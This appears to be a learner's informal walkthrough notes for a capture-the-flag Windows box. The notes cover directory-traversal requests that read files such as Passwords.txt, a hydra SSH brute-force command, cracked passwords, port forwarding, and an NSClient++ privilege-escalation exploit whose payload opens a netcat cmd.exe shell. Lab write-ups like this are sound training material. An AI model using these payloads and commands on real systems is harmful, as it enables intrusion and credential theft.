# Directory Traversal Section
```
vulnx search {program name}
- searched for cve that was disclosed in thes ame year that this machine was created
- copied to system 
```

``` enum4linux - unsuccessful
```
```
servmon/scan » rpcclient -U '' -N  10.129.227.77 - unsuccessful 
```
```
GET /../../../../../../../../../../../../windows/win.ini/C:\Users\Nathan\Desktop\Passwords.txt HTTP/1.1 - unsuccessful 
```
```
GET /../../../../../../../../../../../../windows/win.ini/users - unsuccesful 
```
```
GET /../../../../../../../../../../../../windows/win.ini/files 
HTTP/1.1 - successful 
```
```
GET /../../../../../../../../../../../../windows/win.ini/files HTTP/1.1 - unsuccessful 
```
```
GET /../../../../../../../../../../../../\WINDOWS\system32\drivers\etc\hosts - successful
```
```
http://10.129.227.77/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt - The real successful one 
```
- apparently the win.ini file itself is just a file, so by trying to add to the directory traversal, would be like trying to reference two files at once, which is obviously not possible 
- also, the C:\ value is not shown in the directory traversal request
- know that there are users on the system, not sure what their names are though 
- is it possible to use remote code execution for this? or not? 
331 Anonymous access allowed, send identity (e-mail name) as password.
- email name is probably nate or nadine

 # Nadine's Password
 used hydra brute forcing 
 ```
 hydra -l nadine -P Passwords.txt ssh://ip-address
```
- found the password thorugh trial and error, L1k3B1gBut7s@W0rk 
- what is best way to find the user? could I try to look for .ssh files for the directory traversal?
ON THE SYTSEM 
- can find flag on nadine's laptop, similar to how I did with nathan's
- need to find password for accessing NSClient++ 
- thought about using snaffler to find things currently on the system 
- initially, comamnds were not working. but when i switched to powershell, they started to 
- systeminfo command doesn'tw ork either 
- note: was in cmd instead of powershell. now, itink comamnds willw ork 
- snaffler: not valid of OS platform 
- profit does work 
- snaffler.exe did not work 
-- interesting file list 
RoamingCredentialSettings.xml
 WdsUnattendTemplate.xml
# NS Client Password 
 - Used the following powershell one-liner in the directory containing NSclient information 
 Select-String -Path *.txt, *.ini, *.cfg, *.config, *.xml -Pattern "password" -Context 1, 1
- looks like password SHOULD be 
ew2x6SsGTxjRwXOT
- what is version of nsclient? 
wmic product where name='Netskope Client' get version - must be run as administratron 
if you run the actual .exe file, there are several errors but you do end up seeing 
SClient++ - 0.5.2.35 2018-01-28 Started!



nscp settings --activate-module CheckSystem --add-missing
# NS Client Login & Privilege Escalation 
## Exploit search 
```
vulnx search nsclient++ #chose exploit that matches the year of the box 
```

## Approaches
- Attempted to create reverse shell, downlaod to target system, and use meterpreter to execute the nscpu exploit after background meterpreter session
- Was able to get shell, but was unsuccessful 
- Was succcessful in enabling the settings that would have allowed an external script to be run
- Was successful in creating evil.bat file based on requirements
- Was supposed ot try to use http AND https when it comes to accessing the login panel

## Solutions 
- Was supposed to view the NSClient+++ configuration file and determine what the allowed host was 
- Was supposed to use port forwarding in order to log into Nadine information and view the information in the browser
```
ssh -L 8443:127.0.0.1:8443 Nadine@10.129.100.29
```
Used the following command
```
uv run exploit.py "C:\temp\nc.exe 1001 -e cmd.exe" https://localhost:8443 'ew2x6SsGTxjRwXOT'
```
 Admin flag: 4b7e03e403f4d8746e969a1b19606ba1
